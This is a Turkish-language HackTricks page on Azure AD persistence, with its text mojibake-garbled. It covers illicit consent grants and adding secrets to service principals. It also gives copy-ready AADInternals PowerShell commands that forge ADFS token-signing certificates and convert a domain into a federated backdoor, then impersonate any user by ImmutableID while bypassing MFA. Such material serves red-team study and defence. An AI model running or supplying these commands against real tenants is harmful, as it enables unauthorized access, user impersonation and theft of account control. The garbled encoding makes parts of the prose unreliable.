# Az - KalÄ±cÄ±lÄ±k

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ± gÃ¶rmek** veya HackTricks'i **PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'Ä± takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>

### YasadÄ±ÅŸÄ± Onay Verme

VarsayÄ±lan olarak, herhangi bir kullanÄ±cÄ± Azure AD'de bir uygulama kaydedebilir. Bu nedenle, hedef kiracÄ± iÃ§in yÃ¼ksek etki izinlere ihtiyaÃ§ duyan bir uygulama kaydedebilirsiniz ve yÃ¶netici onayÄ±yla (eÄŸer yÃ¶neticiyseniz onaylayabilirsiniz) - kullanÄ±cÄ±nÄ±n adÄ±na posta gÃ¶nderme, rol yÃ¶netimi vb. gibi. Bu, baÅŸarÄ±lÄ± bir durumda Ã§ok **verimli** olacak bir ÅŸekilde **saldÄ±rÄ±larÄ±** gerÃ§ekleÅŸtirmemizi saÄŸlar.

AyrÄ±ca, uygulamayÄ± kendi kullanÄ±cÄ±nÄ±zla kabul ederek Ã¼zerinde eriÅŸimi sÃ¼rdÃ¼rmek de mÃ¼mkÃ¼ndÃ¼r.

### Uygulamalar ve Hizmet Ä°lkeleri

Uygulama YÃ¶neticisi, GA veya microsoft.directory/applications/credentials/update izinlerine sahip Ã¶zel bir rol ile mevcut bir uygulamaya kimlik bilgileri (gizli veya sertifika) ekleyebiliriz.

YÃ¼ksek izinlere sahip bir uygulamayÄ± **hedef almak** veya yÃ¼ksek izinlere sahip bir **yeni bir uygulama eklemek** mÃ¼mkÃ¼ndÃ¼r.

Uygulamaya eklemek iÃ§in ilginÃ§ bir rol, **AyrÄ±calÄ±klÄ± kimlik doÄŸrulama yÃ¶neticisi rolÃ¼** olabilir, Ã§Ã¼nkÃ¼ Global YÃ¶neticilerin **ÅŸifresini sÄ±fÄ±rlama** izni verir.

Bu teknik ayrÄ±ca **MFA'yÄ± atlamaya** olanak saÄŸlar.

{% code overflow="wrap" %}
```powershell
$passwd = ConvertTo-SecureString "J~Q~QMt_qe4uDzg53MDD_jrj_Q3P.changed" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("311bf843-cc8b-459c-be24-6ed908458623", $passwd)
Connect-AzAccount -ServicePrincipal -Credential $credentials -Tenant e12984235-1035-452e-bd32-ab4d72639a
```
{% endcode %}

* Sertifika tabanlÄ± kimlik doÄŸrulama iÃ§in

{% code overflow="wrap" %}
```powershell
Connect-AzAccount -ServicePrincipal -Tenant <TenantId> -CertificateThumbprint <Thumbprint> -ApplicationId <ApplicationId>
```
{% endcode %}

### Federasyon - Token Ä°mzalama SertifikasÄ±

On-prem AD'de **DA yetkileriyle**, Ã§ok uzun bir geÃ§erlilik sÃ¼resine sahip **yeni Token imzalama** ve **Token Åifreleme sertifikalarÄ±** oluÅŸturmak ve bunlarÄ± iÃ§e aktarmak mÃ¼mkÃ¼ndÃ¼r. Bu, ImuutableID'sini bildiÄŸimiz herhangi bir kullanÄ±cÄ± olarak **giriÅŸ yapmamÄ±za** olanak saÄŸlayacaktÄ±r.

AÅŸaÄŸÄ±daki komutu **ADFS sunucusunda DA olarak Ã§alÄ±ÅŸtÄ±rÄ±n** yeni sertifikalar oluÅŸturmak iÃ§in (varsayÄ±lan ÅŸifre 'AADInternals'), bunlarÄ± ADFS'e ekleyin, otomatik yenilemeyi devre dÄ±ÅŸÄ± bÄ±rakÄ±n ve hizmeti yeniden baÅŸlatÄ±n:
```powershell
New-AADIntADFSSelfSignedCertificates
```
ArdÄ±ndan, Azure AD ile sertifika bilgilerini gÃ¼ncelleyin:
```powershell
Update-AADIntADFSFederationSettings -Domain cyberranges.io
```
### Federasyon - GÃ¼venilen Etki AlanÄ±

Bir kiracÄ±da GA yetkileriyle, **yeni bir etki alanÄ± eklemek** (doÄŸrulanmÄ±ÅŸ olmalÄ±dÄ±r) mÃ¼mkÃ¼ndÃ¼r, kimlik doÄŸrulama tÃ¼rÃ¼nÃ¼ Federasyon olarak yapÄ±landÄ±rmak ve etki alanÄ±nÄ± belirli bir sertifikaya (aÅŸaÄŸÄ±daki komutta any.sts) ve yayÄ±ncÄ±ya gÃ¼venmek iÃ§in yapÄ±landÄ±rmak mÃ¼mkÃ¼ndÃ¼r:
```powershell
# Using AADInternals
ConvertTo-AADIntBackdoor -DomainName cyberranges.io

# Get ImmutableID of the user that we want to impersonate. Using Msol module
Get-MsolUser | select userPrincipalName,ImmutableID

# Access any cloud app as the user
Open-AADIntOffice365Portal -ImmutableID qIMPTm2Q3kimHgg4KQyveA== -Issuer "http://any.sts/B231A11F" -UseBuiltInCertificate -ByPassMFA$true
```
## Referanslar

* [https://aadinternalsbackdoor.azurewebsites.net/](https://aadinternalsbackdoor.azurewebsites.net/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya bizi **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'da takip edin.**
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>
